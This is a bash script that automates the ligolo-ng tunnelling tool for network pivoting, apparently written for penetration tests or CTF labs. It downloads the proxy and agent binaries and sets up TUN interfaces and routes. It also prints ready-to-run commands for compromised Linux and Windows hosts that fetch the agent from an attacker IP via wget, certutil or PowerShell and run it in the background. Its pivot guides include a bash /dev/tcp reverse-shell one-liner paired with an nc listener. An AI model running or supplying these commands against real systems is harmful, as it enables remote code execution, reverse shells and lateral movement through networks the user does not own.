#!/bin/bash
#==============================================================================
#                         LIGOLO-NG @mahdiesta v3.1
#==============================================================================


set -o pipefail

LIGOLO_VERSION="v0.7.2-alpha"
WORK_DIR="$HOME/ligolo"

# FIXED PORT - Important for double pivot!
LIGOLO_PORT=11601

#------------------------------------------------------------------------------
# COLORS
#------------------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
BOLD='\033[1m'
NC='\033[0m'

#------------------------------------------------------------------------------
# LOGGING
#------------------------------------------------------------------------------
info()    { echo -e "${CYAN}[*]${NC} $1"; }
success() { echo -e "${GREEN}[+]${NC} $1"; }
warn()    { echo -e "${YELLOW}[!]${NC} $1"; }
error()   { echo -e "${RED}[-]${NC} $1"; }
cmd()     { echo -e "    ${GREEN}$1${NC}"; }
note()    { echo -e "    ${WHITE}# $1${NC}"; }

#------------------------------------------------------------------------------
# PORT MANAGEMENT
#------------------------------------------------------------------------------
random_port() {
    local min=${1:-10000}
    local max=${2:-60000}
    if [[ -r /dev/urandom ]]; then
        echo $(( min + $(od -An -tu2 -N2 /dev/urandom | tr -d ' ') % (max - min) ))
    else
        echo $(( min + RANDOM % (max - min) ))
    fi
}

port_in_use() {
    local port=$1
    ss -tuln 2>/dev/null | grep -qE ":${port}\b" || \
    netstat -tuln 2>/dev/null | grep -qE ":${port}\b"
}

find_free_port() {
    local base=${1:-10000}
    local max_attempts=50
    local port
    
    for ((i=0; i<max_attempts; i++)); do
        port=$(random_port 10000 60000)
        if ! port_in_use "$port"; then
            echo "$port"
            return 0
        fi
    done
    
    port=$base
    while port_in_use "$port"; do ((port++)); done
    echo "$port"
}

check_ligolo_port() {
    if port_in_use "$LIGOLO_PORT"; then
        warn "Port $LIGOLO_PORT is in use!"
        echo ""
        read -p "Kill the process using port $LIGOLO_PORT? [y/N]: " choice
        if [[ "$choice" =~ ^[Yy]$ ]]; then
            local pid=$(lsof -ti:$LIGOLO_PORT 2>/dev/null | head -1)
            if [[ -n "$pid" ]]; then
                kill -9 "$pid" 2>/dev/null
                sleep 1
                success "Process killed"
            fi
        else
            LIGOLO_PORT=$(find_free_port 11601)
            warn "Using alternative port: $LIGOLO_PORT"
        fi
    fi
}

get_default_ip() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 addr show tap0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -1 || \
    ip -4 route get 1 2>/dev/null | grep -oP 'src \K\d+(\.\d+){3}' | head -1 || \
    hostname -I 2>/dev/null | awk '{print $1}'
}

#------------------------------------------------------------------------------
# BINARY FUNCTIONS
#------------------------------------------------------------------------------
verify_binary() {
    local file=$1
    local min_size=1000000
    
    [[ ! -f "$file" ]] && return 1
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null)
    [[ $size -lt $min_size ]] && return 1
    
    if [[ "$file" == *.exe ]]; then
        head -c 2 "$file" 2>/dev/null | grep -q "MZ" || return 1
    else
        file "$file" 2>/dev/null | grep -q "ELF" || return 1
    fi
    return 0
}

get_binary_info() {
    local file=$1
    if [[ -f "$file" ]]; then
        local size=$(stat -c%s "$file" 2>/dev/null)
        local md5=$(md5sum "$file" 2>/dev/null | cut -d' ' -f1)
        echo "$size:$md5"
    else
        echo "0:none"
    fi
}

setup_binaries() {
    mkdir -p "$WORK_DIR"
    cd "$WORK_DIR" || exit 1
    
    local BASE_URL="https://github.com/nicocha30/ligolo-ng/releases/download/${LIGOLO_VERSION}"
    
    if ! verify_binary "proxy"; then
        info "Downloading proxy..."
        rm -f proxy proxy.tar.gz 2>/dev/null
        if wget -q --show-progress "$BASE_URL/ligolo-ng_proxy_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O proxy.tar.gz; then
            tar -xzf proxy.tar.gz proxy 2>/dev/null
            rm -f proxy.tar.gz LICENSE README.md 2>/dev/null
            chmod +x proxy 2>/dev/null
            verify_binary "proxy" && success "Proxy downloaded" || error "Proxy verification failed"
        else
            error "Failed to download proxy"
        fi
    else
        success "Proxy OK"
    fi
    
    if ! verify_binary "agent"; then
        info "Downloading Linux agent..."
        rm -f agent agent.tar.gz 2>/dev/null
        if wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_linux_amd64.tar.gz" -O agent.tar.gz; then
            tar -xzf agent.tar.gz agent 2>/dev/null
            rm -f agent.tar.gz LICENSE README.md 2>/dev/null
            chmod +x agent 2>/dev/null
            verify_binary "agent" && success "Linux agent downloaded" || error "Linux agent verification failed"
        else
            error "Failed to download Linux agent"
        fi
    else
        success "Linux agent OK"
    fi
    
    if ! verify_binary "agent.exe"; then
        info "Downloading Windows agent..."
        rm -f agent.exe agent.zip 2>/dev/null
        if wget -q --show-progress "$BASE_URL/ligolo-ng_agent_${LIGOLO_VERSION#v}_windows_amd64.zip" -O agent.zip; then
            unzip -qo agent.zip agent.exe 2>/dev/null
            rm -f agent.zip LICENSE README.md 2>/dev/null
            verify_binary "agent.exe" && success "Windows agent downloaded" || error "Windows agent verification failed"
        else
            error "Failed to download Windows agent"
        fi
    else
        success "Windows agent OK"
    fi
    
    local agent_info=$(get_binary_info "$WORK_DIR/agent")
    local win_info=$(get_binary_info "$WORK_DIR/agent.exe")
    AGENT_SIZE=$(echo "$agent_info" | cut -d: -f1)
    AGENT_MD5=$(echo "$agent_info" | cut -d: -f2)
    WIN_SIZE=$(echo "$win_info" | cut -d: -f1)
    WIN_MD5=$(echo "$win_info" | cut -d: -f2)
}

#------------------------------------------------------------------------------
# INTERFACE MANAGEMENT - Multiple TUN support!
#------------------------------------------------------------------------------
setup_interface() {
    local iface="${1:-ligolo}"
    
    if ip link show "$iface" &>/dev/null; then
        sudo ip link set "$iface" up 2>/dev/null
        success "Interface '$iface' ready"
    else
        info "Creating $iface interface..."
        if sudo ip tuntap add user "$(whoami)" mode tun "$iface" 2>/dev/null; then
            sudo ip link set "$iface" up
            success "Interface '$iface' created"
        else
            error "Failed to create interface"
            warn "Run manually:"
            cmd "sudo ip tuntap add user $(whoami) mode tun $iface"
            cmd "sudo ip link set $iface up"
            return 1
        fi
    fi
    
    # Magic IP for first interface only
    if [[ "$iface" == "ligolo" ]]; then
        sudo ip route add 240.0.0.1/32 dev ligolo 2>/dev/null || true
    fi
    
    return 0
}

# Create interface for specific pivot number
create_pivot_interface() {
    local num="${1:-2}"
    local iface="ligolo"
    
    if [[ "$num" -gt 1 ]]; then
        iface="ligolo${num}"
    fi
    
    setup_interface "$iface"
    echo "$iface"
}

# List all ligolo interfaces
list_interfaces() {
    echo ""
    info "Ligolo interfaces:"
    for iface in ligolo ligolo2 ligolo3 ligolo4 ligolo5; do
        if ip link show "$iface" &>/dev/null; then
            local state=$(ip link show "$iface" | grep -oP 'state \K\w+')
            echo -e "    ${GREEN}✓${NC} $iface ($state)"
            ip route show dev "$iface" 2>/dev/null | while read line; do
                echo -e "        → $line"
            done
        fi
    done
}

#------------------------------------------------------------------------------
# GENERATE COMMANDS FILE
#------------------------------------------------------------------------------
generate_commands() {
    cat > "$WORK_DIR/commands.txt" << CMDEOF
================================================================================
LIGOLO-NG COMMANDS v3.1
================================================================================
Attacker IP:    $ATTACKER_IP
Ligolo Port:    $LIGOLO_PORT  <-- FIXED PORT
HTTP Port:      $HTTP_PORT
--------------------------------------------------------------------------------
Linux Agent:    $AGENT_SIZE bytes | MD5: $AGENT_MD5
Windows Agent:  $WIN_SIZE bytes | MD5: $WIN_MD5
================================================================================

=== START HTTP SERVER (new terminal) ===

cd $WORK_DIR && python3 -m http.server $HTTP_PORT

=== LINUX PIVOT ===

wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent && chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

# Background
nohup /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert &>/dev/null &

=== WINDOWS PIVOT ===

certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\Windows\Temp\agent.exe
C:\Windows\Temp\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert

powershell -c "iwr http://$ATTACKER_IP:$HTTP_PORT/agent.exe -OutFile C:\Windows\Temp\agent.exe; C:\Windows\Temp\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"

=== LIGOLO CONSOLE ===

session                  # Use ARROW KEYS to select!
ifconfig                 # Show pivot's networks
start                    # Start tunnel (uses 'ligolo' interface)
start --tun ligolo2      # Start tunnel on specific interface
stop                     # Stop tunnel
listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp
listener_list

=== ADD ROUTES ===

sudo ip route add 172.16.0.0/16 dev ligolo
sudo ip route add 10.10.10.0/24 dev ligolo2
ip route show dev ligolo

================================================================================
DOUBLE PIVOT - COMPLETE GUIDE
================================================================================

SCENARIO: Attacker -> Pivot1 (172.16.5.15) -> Pivot2 (172.16.5.35)

=== PHASE 1: FIRST PIVOT (Pivot1) ===

1. Start script, connect Pivot1 agent
2. In Ligolo: session (select Pivot1) → ifconfig → start
3. Add route: sudo ip route add 172.16.0.0/16 dev ligolo
4. Test: ping 172.16.5.35 (should work!)

=== PHASE 2: PREPARE FOR SECOND PIVOT ===

5. Create listener on Pivot1 (in Ligolo):
   listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

6. Create second TUN interface (NEW TERMINAL on attacker):
   sudo ip tuntap add user \$(whoami) mode tun ligolo2
   sudo ip link set ligolo2 up

=== PHASE 3: CONNECT SECOND PIVOT (Pivot2) ===

7. Transfer agent to Pivot2:
   # From Pivot1: python3 -m http.server 8888
   # On Pivot2:
   wget http://172.16.5.15:8888/agent -O /tmp/agent
   # Or Windows:
   certutil -urlcache -f http://172.16.5.15:8888/agent.exe C:\Windows\Temp\agent.exe

8. Run agent on Pivot2 (connects to Pivot1's internal IP!):
   Linux:   /tmp/agent -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert
   Windows: C:\Windows\Temp\agent.exe -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert

=== PHASE 4: START SECOND TUNNEL ===

9. In Ligolo: session (select Pivot2 with arrow keys)
10. In Ligolo: ifconfig (see Pivot2's networks)
11. In Ligolo: start --tun ligolo2    <-- USE DIFFERENT INTERFACE!
12. Add route: sudo ip route add 172.16.6.0/24 dev ligolo2

DONE! You can now access both networks!

================================================================================
TRIPLE PIVOT
================================================================================

Same process:

1. Create ligolo3: sudo ip tuntap add user \$(whoami) mode tun ligolo3 && sudo ip link set ligolo3 up
2. In Ligolo (Pivot2): listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp
3. On Pivot3: /tmp/agent -connect PIVOT2_INTERNAL_IP:$LIGOLO_PORT -ignore-cert
4. In Ligolo: session (select Pivot3) → start --tun ligolo3
5. Add route: sudo ip route add <NETWORK> dev ligolo3

================================================================================
INTERFACE QUICK REFERENCE
================================================================================

CREATE INTERFACES:
  sudo ip tuntap add user \$(whoami) mode tun ligolo
  sudo ip tuntap add user \$(whoami) mode tun ligolo2
  sudo ip tuntap add user \$(whoami) mode tun ligolo3
  sudo ip link set ligolo up
  sudo ip link set ligolo2 up
  sudo ip link set ligolo3 up

START TUNNELS (in Ligolo):
  Pivot1: start                  # Uses 'ligolo'
  Pivot2: start --tun ligolo2    # Uses 'ligolo2'
  Pivot3: start --tun ligolo3    # Uses 'ligolo3'

ADD ROUTES:
  sudo ip route add 172.16.5.0/24 dev ligolo    # Pivot1's network
  sudo ip route add 172.16.6.0/24 dev ligolo2   # Pivot2's network
  sudo ip route add 10.10.10.0/24 dev ligolo3   # Pivot3's network

================================================================================
REVERSE PORT FORWARD
================================================================================

# Catch shells from internal network

1. Attacker: nc -lvnp 4444
2. Ligolo:   listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
3. Target:   bash -i >& /dev/tcp/PIVOT_INTERNAL_IP/4444 0>&1

================================================================================
COMMON ERRORS
================================================================================

"a tunnel is already using this interface name"
  → Use different interface: start --tun ligolo2
  → First create it: sudo ip tuntap add user \$(whoami) mode tun ligolo2

"connection refused" on double pivot
  → Check listener port matches proxy port ($LIGOLO_PORT)
  → listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp

"TLS handshake error"
  → Agent binary corrupted. Re-download, verify size > 1MB

================================================================================
CMDEOF

    success "Commands saved to $WORK_DIR/commands.txt"
}

#------------------------------------------------------------------------------
# PRINT INSTRUCTIONS
#------------------------------------------------------------------------------
print_instructions() {
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}                    LIGOLO-NG READY${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  Attacker IP:    ${GREEN}$ATTACKER_IP${NC}"
    echo -e "  Ligolo Port:    ${GREEN}$LIGOLO_PORT${NC}  ${YELLOW}<-- FIXED${NC}"
    echo -e "  HTTP Port:      ${GREEN}$HTTP_PORT${NC}  ${YELLOW}(random)${NC}"
    echo -e "  Agent Size:     ${WHITE}$AGENT_SIZE${NC} bytes"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 1: Start HTTP server${NC} ${YELLOW}(new terminal)${NC}"
    cmd "cd $WORK_DIR && python3 -m http.server $HTTP_PORT"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 2: On pivot (Linux)${NC}"
    cmd "wget http://$ATTACKER_IP:$HTTP_PORT/agent -O /tmp/agent"
    cmd "chmod +x /tmp/agent && /tmp/agent -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 2: On pivot (Windows)${NC}"
    cmd "certutil -urlcache -f http://$ATTACKER_IP:$HTTP_PORT/agent.exe C:\\Windows\\Temp\\agent.exe"
    cmd "C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 3: After agent connects${NC}"
    echo -e "    ${GREEN}session${NC} ${YELLOW}(ARROW KEYS!)${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo ""
    echo -e "${WHITE}${BOLD}STEP 4: Add routes${NC} ${YELLOW}(new terminal)${NC}"
    cmd "sudo ip route add 172.16.0.0/16 dev ligolo"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "  ${WHITE}Full commands:${NC}  ${YELLOW}cat $WORK_DIR/commands.txt${NC}"
    echo -e "  ${WHITE}Double pivot:${NC}   ${YELLOW}$0 pivot${NC}"
    echo -e "  ${WHITE}Add interface:${NC}  ${YELLOW}$0 interface 2${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
}

#------------------------------------------------------------------------------
# SHOW PIVOT GUIDE
#------------------------------------------------------------------------------
show_pivot_guide() {
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}              DOUBLE PIVOT - COMPLETE GUIDE${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "${RED}${BOLD}  REMEMBER: Proxy port = $LIGOLO_PORT${NC}"
    echo ""
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  PHASE 1: FIRST PIVOT WORKING${NC}"
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo ""
    echo -e "  ${GREEN}✓${NC} Pivot1 agent connected"
    echo -e "  ${GREEN}✓${NC} In Ligolo: ${GREEN}session${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo -e "  ${GREEN}✓${NC} Route added: ${GREEN}sudo ip route add 172.16.0.0/16 dev ligolo${NC}"
    echo -e "  ${GREEN}✓${NC} Test connectivity to Pivot2 (ping works)"
    echo ""
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  PHASE 2: PREPARE FOR DOUBLE PIVOT${NC}"
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo ""
    echo -e "  ${WHITE}Step 5: Create listener on Pivot1${NC}"
    note "In Ligolo console"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${WHITE}Step 6: Create second TUN interface${NC}"
    note "NEW TERMINAL on attacker - IMPORTANT!"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo2"
    cmd "sudo ip link set ligolo2 up"
    note "Or use: $0 interface 2"
    echo ""
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  PHASE 3: CONNECT PIVOT2${NC}"
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo ""
    echo -e "  ${WHITE}Step 7: Transfer agent to Pivot2${NC}"
    note "Start HTTP on Pivot1 (in Pivot1's shell):"
    cmd "python3 -m http.server 8888"
    echo ""
    note "On Pivot2 (Linux):"
    cmd "wget http://PIVOT1_INTERNAL_IP:8888/agent -O /tmp/agent"
    cmd "chmod +x /tmp/agent"
    echo ""
    note "On Pivot2 (Windows):"
    cmd "certutil -urlcache -f http://PIVOT1_INTERNAL_IP:8888/agent.exe C:\\Windows\\Temp\\agent.exe"
    echo ""
    echo -e "  ${WHITE}Step 8: Run agent on Pivot2${NC}"
    echo -e "  ${YELLOW}Connect to PIVOT1's INTERNAL IP, not attacker!${NC}"
    echo ""
    note "Linux:"
    cmd "/tmp/agent -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert"
    echo ""
    note "Windows:"
    cmd "C:\\Windows\\Temp\\agent.exe -connect 172.16.5.15:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  PHASE 4: START SECOND TUNNEL${NC}"
    echo -e "${CYAN}────────────────────────────────────────────────────────────────${NC}"
    echo ""
    echo -e "  ${WHITE}Step 9: Select Pivot2 in Ligolo${NC}"
    cmd "session"
    note "Use ARROW KEYS to select Pivot2"
    echo ""
    echo -e "  ${WHITE}Step 10: View Pivot2's networks${NC}"
    cmd "ifconfig"
    echo ""
    echo -e "  ${WHITE}Step 11: Start tunnel on ligolo2${NC}"
    cmd "start --tun ligolo2"
    echo -e "              ${YELLOW}^^^^^^^^${NC}"
    echo -e "              ${YELLOW}DIFFERENT INTERFACE!${NC}"
    echo ""
    echo -e "  ${WHITE}Step 12: Add route for new network${NC}"
    note "NEW TERMINAL on attacker"
    cmd "sudo ip route add 172.16.6.0/24 dev ligolo2"
    echo ""
    echo -e "${GREEN}${BOLD}  ✓ DONE! You can now access both networks!${NC}"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}              TRIPLE PIVOT${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}1.${NC} Create ligolo3:"
    cmd "sudo ip tuntap add user \$(whoami) mode tun ligolo3"
    cmd "sudo ip link set ligolo3 up"
    echo ""
    echo -e "  ${WHITE}2.${NC} In Ligolo (Pivot2 selected):"
    cmd "listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp"
    echo ""
    echo -e "  ${WHITE}3.${NC} On Pivot3:"
    cmd "/tmp/agent -connect PIVOT2_INTERNAL_IP:$LIGOLO_PORT -ignore-cert"
    echo ""
    echo -e "  ${WHITE}4.${NC} In Ligolo:"
    cmd "session"
    note "Select Pivot3"
    cmd "start --tun ligolo3"
    echo ""
    echo -e "  ${WHITE}5.${NC} Add route:"
    cmd "sudo ip route add 10.10.10.0/24 dev ligolo3"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}              REVERSE PORT FORWARD${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    note "Catch shells from internal network"
    echo ""
    echo -e "  ${WHITE}Attacker:${NC}"
    cmd "nc -lvnp 4444"
    echo ""
    echo -e "  ${WHITE}Ligolo:${NC}"
    cmd "listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp"
    echo ""
    echo -e "  ${WHITE}Internal target:${NC}"
    cmd "bash -i >& /dev/tcp/PIVOT_INTERNAL_IP/4444 0>&1"
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}              COMMON ERRORS${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${RED}\"a tunnel is already using this interface name\"${NC}"
    echo -e "    → Create new interface: ${GREEN}sudo ip tuntap add user \$(whoami) mode tun ligolo2${NC}"
    echo -e "    → Start with: ${GREEN}start --tun ligolo2${NC}"
    echo ""
    echo -e "  ${RED}\"connection refused\" on double pivot${NC}"
    echo -e "    → Your listener port must match proxy port: ${GREEN}$LIGOLO_PORT${NC}"
    echo -e "    → ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp${NC}"
    echo ""
    echo -e "  ${RED}\"TLS handshake error\"${NC}"
    echo -e "    → Agent corrupted, re-download, verify size > 1MB"
    echo ""
}

#------------------------------------------------------------------------------
# ADD ROUTE
#------------------------------------------------------------------------------
add_route() {
    local network="$1"
    local iface="${2:-ligolo}"
    
    if [[ -z "$network" ]]; then
        read -p "Enter network (e.g., 172.16.0.0/16): " network
    fi
    
    if [[ "$network" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/[0-9]+$ ]]; then
        if sudo ip route add "$network" dev "$iface" 2>/dev/null; then
            success "Route added: $network via $iface"
        else
            warn "Route may already exist"
        fi
    else
        error "Invalid format. Use CIDR (e.g., 172.16.0.0/16)"
    fi
    
    echo ""
    info "Current routes through $iface:"
    ip route show dev "$iface" 2>/dev/null | while read line; do
        echo -e "    ${GREEN}$line${NC}"
    done
}

#------------------------------------------------------------------------------
# STATUS
#------------------------------------------------------------------------------
show_status() {
    echo ""
    echo -e "${WHITE}${BOLD}=== LIGOLO STATUS ===${NC}"
    echo ""
    
    # Interfaces
    echo "Interfaces:"
    for iface in ligolo ligolo2 ligolo3 ligolo4 ligolo5; do
        if ip link show "$iface" &>/dev/null; then
            echo -e "    ${GREEN}✓${NC} $iface: UP"
            ip route show dev "$iface" 2>/dev/null | while read line; do
                echo -e "        → $line"
            done
        fi
    done
    
    # Check if any interface exists
    if ! ip link show ligolo &>/dev/null; then
        echo -e "    ${YELLOW}○${NC} No ligolo interfaces found"
    fi
    
    echo ""
    
    # Proxy
    echo -n "Proxy: "
    if pgrep -f "ligolo.*proxy" &>/dev/null; then
        local port=$(ss -tlnp 2>/dev/null | grep proxy | grep -oP ':\K\d+' | head -1)
        echo -e "${GREEN}RUNNING${NC} (port: ${port:-$LIGOLO_PORT})"
    else
        echo -e "${YELLOW}NOT RUNNING${NC}"
    fi
    
    echo ""
    
    # Files
    echo "Files in $WORK_DIR:"
    for f in proxy agent agent.exe; do
        if [[ -f "$WORK_DIR/$f" ]]; then
            local size=$(stat -c%s "$WORK_DIR/$f" 2>/dev/null)
            echo -e "    ${GREEN}✓${NC} $f: $size bytes"
        else
            echo -e "    ${YELLOW}○${NC} $f: not found"
        fi
    done
    echo ""
}

#------------------------------------------------------------------------------
# CLEANUP
#------------------------------------------------------------------------------
cleanup() {
    info "Stopping processes..."
    pkill -9 -f "ligolo.*proxy" 2>/dev/null || true
    
    info "Removing interfaces..."
    for iface in ligolo ligolo2 ligolo3 ligolo4 ligolo5; do
        if ip link show "$iface" &>/dev/null; then
            sudo ip link set "$iface" down 2>/dev/null || true
            sudo ip link delete "$iface" 2>/dev/null || true
            echo -e "    Removed $iface"
        fi
    done
    
    success "Cleanup complete"
}

#------------------------------------------------------------------------------
# RUN PROXY
#------------------------------------------------------------------------------
run_proxy() {
    cd "$WORK_DIR" || exit 1
    
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}  LIGOLO PROXY - PORT $LIGOLO_PORT${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "  ${YELLOW}SESSION:${NC}      Use ${GREEN}ARROW KEYS${NC} to select!"
    echo -e "  ${YELLOW}AFTER CONNECT:${NC} ${GREEN}session${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo -e "  ${YELLOW}ADD ROUTES:${NC}   ${GREEN}sudo ip route add <NET>/24 dev ligolo${NC}"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo -e "${WHITE}${BOLD}  DOUBLE PIVOT QUICK REFERENCE${NC}"
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    echo -e "  ${WHITE}1.${NC} First pivot: ${GREEN}session${NC} → ${GREEN}ifconfig${NC} → ${GREEN}start${NC}"
    echo -e "  ${WHITE}2.${NC} Route: ${GREEN}sudo ip route add 172.16.0.0/16 dev ligolo${NC}"
    echo -e "  ${WHITE}3.${NC} Listener: ${GREEN}listener_add --addr 0.0.0.0:$LIGOLO_PORT --to 127.0.0.1:$LIGOLO_PORT --tcp${NC}"
    echo -e "  ${WHITE}4.${NC} New interface: ${GREEN}sudo ip tuntap add user \$(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up${NC}"
    echo -e "  ${WHITE}5.${NC} Pivot2: ${GREEN}/tmp/agent -connect PIVOT1_IP:$LIGOLO_PORT -ignore-cert${NC}"
    echo -e "  ${WHITE}6.${NC} Select Pivot2: ${GREEN}session${NC} (arrow keys)"
    echo -e "  ${WHITE}7.${NC} Start on ligolo2: ${GREEN}start --tun ligolo2${NC}"
    echo -e "  ${WHITE}8.${NC} Route: ${GREEN}sudo ip route add <NEW_NET>/24 dev ligolo2${NC}"
    echo ""
    echo -e "  ${WHITE}Full guide:${NC} ${YELLOW}$0 pivot${NC}"
    echo ""
    echo -e "${CYAN}================================================================${NC}"
    echo ""
    
    exec ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT
}

#------------------------------------------------------------------------------
# MAIN
#------------------------------------------------------------------------------
main() {
    case "${1:-}" in
        -h|--help|help)
            echo "Usage: $0 [command] [options]"
            echo ""
            echo "Commands:"
            echo "  (no args)              Interactive setup"
            echo "  start IP               Quick start with IP"
            echo "  route NETWORK [IFACE]  Add route (default: ligolo)"
            echo "  interface [NUM]        Create interface (ligolo, ligolo2, ligolo3...)"
            echo "  pivot                  Double pivot guide"
            echo "  status                 Show status"
            echo "  commands               Show commands"
            echo "  cleanup                Stop everything"
            echo ""
            echo "Examples:"
            echo "  $0                          # Interactive"
            echo "  $0 start 10.10.14.5         # Quick start"
            echo "  $0 route 172.16.0.0/16      # Add route to ligolo"
            echo "  $0 route 10.10.10.0/24 ligolo2  # Add route to ligolo2"
            echo "  $0 interface 2              # Create ligolo2"
            echo "  $0 pivot                    # Show pivot guide"
            exit 0
            ;;
        
        start)
            ATTACKER_IP="${2:-$(get_default_ip)}"
            HTTP_PORT=$(find_free_port 8080)
            
            check_ligolo_port
            setup_binaries
            setup_interface "ligolo"
            generate_commands
            print_instructions
            
            info "Starting proxy on port $LIGOLO_PORT..."
            run_proxy
            ;;
        
        route)
            add_route "$2" "${3:-ligolo}"
            ;;
        
        interface|iface|tun)
            local num="${2:-1}"
            local iface="ligolo"
            [[ "$num" -gt 1 ]] && iface="ligolo${num}"
            
            setup_interface "$iface"
            list_interfaces
            ;;
        
        pivot)
            HTTP_PORT=${HTTP_PORT:-8080}
            ATTACKER_IP=$(get_default_ip)
            show_pivot_guide
            ;;
        
        status)
            show_status
            ;;
        
        commands)
            [[ -f "$WORK_DIR/commands.txt" ]] && cat "$WORK_DIR/commands.txt" || error "Run setup first"
            ;;
        
        cleanup)
            cleanup
            ;;
        
        *)
            # Interactive
            echo ""
            echo -e "${CYAN}========================================${NC}"
            echo -e "${WHITE}${BOLD}       LIGOLO-NG AUTOMATION v3.1${NC}"
            echo -e "${CYAN}========================================${NC}"
            echo ""
            
            local default_ip=$(get_default_ip)
            read -p "Enter your IP [$default_ip]: " input_ip
            ATTACKER_IP="${input_ip:-$default_ip}"
            
            if ! [[ "$ATTACKER_IP" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
                error "Invalid IP"
                exit 1
            fi
            
            check_ligolo_port
            HTTP_PORT=$(find_free_port 8080)
            
            echo ""
            info "Configuration:"
            echo -e "    IP:          ${GREEN}$ATTACKER_IP${NC}"
            echo -e "    Ligolo Port: ${GREEN}$LIGOLO_PORT${NC} ${YELLOW}(fixed)${NC}"
            echo -e "    HTTP Port:   ${GREEN}$HTTP_PORT${NC} ${YELLOW}(random)${NC}"
            echo ""
            
            setup_binaries
            setup_interface "ligolo"
            generate_commands
            print_instructions
            
            read -p "Start proxy now? [Y/n]: " choice
            if [[ ! "$choice" =~ ^[Nn]$ ]]; then
                info "Starting proxy on port $LIGOLO_PORT..."
                echo ""
                run_proxy
            else
                echo ""
                info "To start later:"
                cmd "cd $WORK_DIR && ./proxy -selfcert -laddr 0.0.0.0:$LIGOLO_PORT"
            fi
            ;;
    esac
}

main "$@"
